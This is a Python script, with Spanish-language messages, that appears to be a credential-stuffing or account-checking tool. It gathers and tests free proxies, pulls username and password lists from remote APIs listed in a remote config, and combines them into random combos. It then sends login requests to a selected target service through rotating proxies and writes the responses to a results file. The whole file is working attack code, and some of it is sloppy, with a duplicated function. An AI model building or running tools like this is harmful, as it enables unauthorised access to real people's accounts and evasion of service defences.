import os
import sys
import time
import json
import signal
import random
import sqlite3
import argparse
import inquirer
import asyncio
import aiohttp
import requests
from tqdm import tqdm
import JkProxyGetter as PXY
from colorama import Fore, Style
from concurrent.futures import ProcessPoolExecutor

# Constantes
MAX_RETRIES = 2
REQUEST_TIMEOUT = 1
REQUEST_TIMEOUT_CHECK_PROXY = 5
DATABASE_PATH = None
NEW_URL = False
DOMAIN_URL = None
SERVICE_NAME = None
USER_API_URL = None
PASS_API_URL = None
MAX_WORKERS = None
THREADS = 20

def get_max_workers():
    try:
        cpu_cores = os.cpu_count()
        max_workers = min(cpu_cores * 2, THREADS)
        print_warning(f"Using {max_workers} threads!")
        return max_workers
    
    except Exception as e:
        print_error(f"Error al obtener el número de núcleos de la CPU: {e}")
        return None
def create_tables(conn, config):
    try:
        cursor = conn.cursor()

        for table_name, columns in config["database"]["tables"].items():
            columns_definition = ', '.join(columns)
            cursor.execute(f"CREATE TABLE IF NOT EXISTS {table_name} ({columns_definition})")

        conn.commit()
        cursor.close()
        print_success("Tablas creadas correctamente.")
    except Exception as e:
        print_error(f"Error al crear las tablas en la base de datos: {e}")
        sys.exit(1)
def check_proxy(proxy):
    try:
        response = requests.get('https://www.google.com', proxies={'http': proxy, 'https': proxy}, timeout=REQUEST_TIMEOUT_CHECK_PROXY)
        if response.status_code == 200:
            insert_proxy(conn=conn, proxy=proxy)
            return proxy
    except Exception as e:
        pass
def insert_proxy(conn, proxy):
    try:
        cursor = conn.cursor()
        ip, port = proxy.split(':') if ':' in proxy else (proxy, None)
        cursor.execute("INSERT INTO proxys (ip, port) VALUES (?, ?)", (ip, port))
        conn.commit()
        cursor.close()
        print_success(f"Proxy insertado en la base de datos: {proxy}")
    except Exception as e:
        pass

def signal_handler(sig, frame):
    time.sleep(2)
    print(f"{Fore.YELLOW}Ctrl+C presionado. Cancelando la ejecución...{Style.RESET_ALL}")
    sys.exit(0)

def load_config():
    try:
        response = requests.get('https://j0rd1s3rr4n0.github.io/api/RogueCheckM/config.json')
        config = response.json()
        return config
    except Exception as e:
        print_error(f"Error al cargar la configuración: {e}")
        sys.exit(1)

def print_error(message):
    print(f"{Fore.RED}[✕] {message}{Style.RESET_ALL}")

def print_success(message):
    print(f"{Fore.GREEN}[✓] {message}{Style.RESET_ALL}")

def print_warning(message):
    print(f"{Fore.YELLOW}[‼] {message}{Style.RESET_ALL}")

def print_process(message):
    print(f"{Fore.BLUE}[ↂ]{message}{Style.RESET_ALL}")


async def async_check_proxy(session, proxy):
    try:
        async with session.get('https://www.google.com', proxies={'http': proxy, 'https': proxy}, timeout=REQUEST_TIMEOUT_CHECK_PROXY) as response:
            if response.status == 200:
                insert_proxy(conn=conn, proxy=proxy)
                return proxy
    except Exception as e:
        pass

async def async_get_proxies(session, url):
    try:
        async with session.get(url, timeout=REQUEST_TIMEOUT) as response:
            return await response.text()
    except Exception as e:
        pass

async def async_working_proxies():
    try:
        print(f"{Fore.CYAN}Searching and Checking proxies...{Style.RESET_ALL}")
        async with aiohttp.ClientSession() as session:
            tasks = [async_check_proxy(session, proxy) for proxy in await async_get_proxies(session, config["proxy_sources"])]
            results = await asyncio.gather(*tasks)
        
        working_proxies_list = [proxy for proxy in results if proxy is not None]
        print_success(f'Encontrados {len(working_proxies_list)} proxies funcionando.')

        if not working_proxies_list:
            print_warning("CANCELADA LA VERIFICACIÓN DE CUENTAS POR FALTA DE PROXIES")
            sys.exit(0)

        return working_proxies_list
    except Exception as e:
        print_error(f"An error occurred in 'working_proxies': {e}")
        return []
def insert_proxy(conn, proxy):
    try:
        cursor = conn.cursor()
        ip, port = proxy.split(':') if ':' in proxy else (proxy, None)
        cursor.execute("INSERT INTO proxys (ip, port) VALUES (?, ?)", (ip, port))
        conn.commit()
        cursor.close()
        print_success(f"Proxy insertado en la base de datos: {proxy}")
    except Exception as e:
        pass
def insert_usernames(conn, usernames):
    try:
        cursor = conn.cursor()
        for username in usernames:
            cursor.execute("INSERT INTO Usernames (username) VALUES (?)", (username,))
        conn.commit()
        cursor.close()
        print_success("Usernames insertados correctamente.")
    except Exception as e:
        print_error(f"Error al insertar los usernames en la base de datos: {e}")

def insert_passwords(conn, passwords):
    try:
        cursor = conn.cursor()
        for password in passwords:
            cursor.execute("INSERT INTO Passwords (password) VALUES (?)", (password,))
        conn.commit()
        cursor.close()
        print_success("Passwords insertados correctamente.")
    except Exception as e:
        print_error(f"Error al insertar los passwords en la base de datos: {e}")

def get_usernames(proxy):
    try:
        with sqlite3.connect(DATABASE_PATH) as conn:
            response = requests.get(USER_API_URL, proxies={'http': proxy, 'https': proxy}, timeout=REQUEST_TIMEOUT)
            usernames = random.sample(response.json(), 100)
            insert_usernames(conn, usernames)
            return usernames
    except Exception as e:
        return []

def get_passwords(proxy):
    try:
        retries = 0
        while retries < MAX_RETRIES:
            try:
                with sqlite3.connect(DATABASE_PATH) as conn:
                    response = requests.get(PASS_API_URL, proxies={'http': proxy, 'https': proxy}, timeout=REQUEST_TIMEOUT)
                    passwords = random.sample(response.json(), 100)
                    insert_passwords(conn, passwords)
                    return passwords
            except Exception as e:
                retries += 1
        return []
    except KeyboardInterrupt:
        time.sleep(2)
        print(f"{Fore.YELLOW}Ctrl+C presionado. Cancelando la ejecución...{Style.RESET_ALL}")
def generate_combos(conn):
    try:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM Combos")
        cursor.execute("SELECT username FROM Usernames")
        usernames = [record[0] for record in cursor.fetchall()]
        cursor.execute("SELECT password FROM Passwords")
        passwords = [record[0] for record in cursor.fetchall()]

        for _ in range(100):
            username = random.choice(usernames)
            password = random.choice(passwords)
            cursor.execute("INSERT INTO Combos (username, password) VALUES (?, ?)", (username, password))

        conn.commit()
        cursor.close()
        print_success("Combos generados correctamente.")

    except Exception as e:
        print_error(f"Error al generar combos: {e}")

def parse_arguments():
    parser = argparse.ArgumentParser(description="Tu descripción del script")
    parser.add_argument("--url", "-u", dest="new_url", metavar="NEW_URL", type=str, help="Establecer una nueva URL")
    parser.add_argument("--site", "-s", dest="service", metavar="SERVICE", type=str, help="Establecer el servicio objetivo")
    parser.add_argument("--threads", "-t", dest="THREADS", metavar="THREADS", type=int, help="Establecer numero de hilos")
    return parser.parse_args()

def load_http_proxies():
    try:
        with open("http.txt", "r") as file:
            proxies = file.read().splitlines()
            return proxies
    except Exception as e:
        print_error(f"Error al cargar proxies desde http.txt: {e}")
        return []

def get_proxies():
    proxy_urls = config["proxy_sources"]
    proxies = []

    # Añadir proxies de http_proxies.txt
    proxies.extend(load_http_proxies())

    try:
        for url in proxy_urls:
            try:
                response = requests.get(url, timeout=REQUEST_TIMEOUT)
                proxies.extend(response.text.split('\r\n'))
            except Exception as e:
                pass
    except KeyboardInterrupt:
        time.sleep(2)
        print(f"{Fore.YELLOW}Ctrl+C presionado. Cancelando la ejecución...{Style.RESET_ALL}")
    return proxies
def working_proxies():
    try:
        print(f"{Fore.CYAN}Searching and Checking proxies...{Style.RESET_ALL}")
        with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
            proxies = list(tqdm(executor.map(check_proxy, get_proxies()), total=len(get_proxies()), desc="Searching and Checking proxies", unit=" proxies"))

        working_proxies_list = [proxy for proxy in proxies if proxy is not None]
        print_success(f'Encontrados {len(working_proxies_list)} proxies funcionando.')

        if not working_proxies_list:
            print_warning("CANCELADA LA VERIFICACIÓN DE CUENTAS POR FALTA DE PROXIES")
            sys.exit(0)

        return working_proxies_list
    except Exception as e:
        print_error(f"An error occurred in 'working_proxies': {e}")
        return []
def send_http_requests(conn, combos_len, domain_url, service_name):
    try:
        with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
            combos = [(record[0], record[1]) for record in conn.execute("SELECT username, password FROM Combos").fetchall()]
            working_proxies_list = working_proxies()

            results = list(executor.map(request_web_combos, [(combos[i:i + 100], working_proxies_list, domain_url, service_name) for i in range(0, combos_len, 100)]))

        with open('results.txt', 'w') as results_file:
            for result_set in results:
                for result in result_set:
                    print(result)
                    results_file.write(result + '\n')
    except Exception as e:
        print_error(f"Error al enviar solicitudes HTTP: {e}")

def request_web_combos(args):
    try:
        combos_chunk, proxies, domain_url, service_name = args
        results = []
        description = f"Sending HTTP Requests to {domain_url}"

        for combo in tqdm(combos_chunk, desc=description, unit="combo_proxy"):
            username, password = combo
            url = f'https://{domain_url}?username={username}&password={password}'
            proxy = random.choice(proxies) if proxies else None
            try:
                response = requests.get(url, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=REQUEST_TIMEOUT)
                response.raise_for_status()
                results.append(response.text)
            except requests.RequestException as e:
                pass
        return results
    except Exception as e:
        print_error(f"Error en la función request_web_combos: {e}")
        return []

def main():
    signal.signal(signal.SIGINT, signal_handler)
    args = parse_arguments()
    global THREADS
    if args.THREADS:
        THREADS = args.THREADS
    global MAX_WORKERS
    MAX_WORKERS = get_max_workers()
    try:
        PXY.start()
        print_success(f' Added new Proxys')
        global config, conn, DATABASE_PATH, USER_API_URL, PASS_API_URL
        print_process("CARGANDO AJUSTES")
        config = load_config()
        
        DATABASE_PATH = config["database"]["DATABASE_PATH"]
        USER_API_URL = config["urls"]["user_api"]
        PASS_API_URL = config["urls"]["pass_api"]
        
        with sqlite3.connect(DATABASE_PATH) as conn:
            create_tables(conn, config)
            print_process("Calentano Motores... (Preparando Hilos)")
            with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
                proxies = list(tqdm(executor.map(check_proxy, get_proxies()), total=len(get_proxies()), desc="Searching and Checking proxies", unit=" proxies"))
            
            working_proxies_list = [proxy for proxy in proxies if proxy is not None]
            print_success(f'Encontrados {len(working_proxies_list)} proxies funcionando.')
            
            if not working_proxies_list:
                print_warning("CANCELADA LA VERIFICACIÓN DE CUENTAS POR FALTA DE PROXIES")
                return

            with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
                usernames = list(tqdm(executor.map(get_usernames, working_proxies_list), total=len(working_proxies_list), desc="Searching Usernames and Passwords", unit=" combos_proxy"))

            with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
                passwords = list(tqdm(executor.map(get_passwords, working_proxies_list), total=len(working_proxies_list), desc="Checking Valid Formats"))

            generate_combos(conn)
            combos_len = min(len(usernames), len(passwords))
            print_success(f'Obtenidos {combos_len} usernames y passwords.')

            if args.new_url:
                DOMAIN_URL = args.new_url
            elif "domain_default" in config["urls"]:
                DOMAIN_URL = config["urls"]["domain_default"]
            else:
                DOMAIN_URL = input("Enter the Domain URL to target: ")

            print(f'Target Domain: {DOMAIN_URL}')

            if args.service:
                SERVICE_NAME = args.service
            else:
                target_domains = config["target_domains"]
                questions = [inquirer.List("service", message="Select the target service", choices=list(target_domains.keys()),),]
                answers = inquirer.prompt(questions)
                SERVICE_NAME = answers["service"]
                DOMAIN_URL = target_domains[SERVICE_NAME]

            print(f'Target Service: {SERVICE_NAME}')

            send_http_requests(conn=conn, combos_len=combos_len, domain_url=DOMAIN_URL, service_name=SERVICE_NAME)

    except requests.RequestException as e:
        print_error(f"Error inesperado: {e}")

if __name__ == "__main__":
    main()
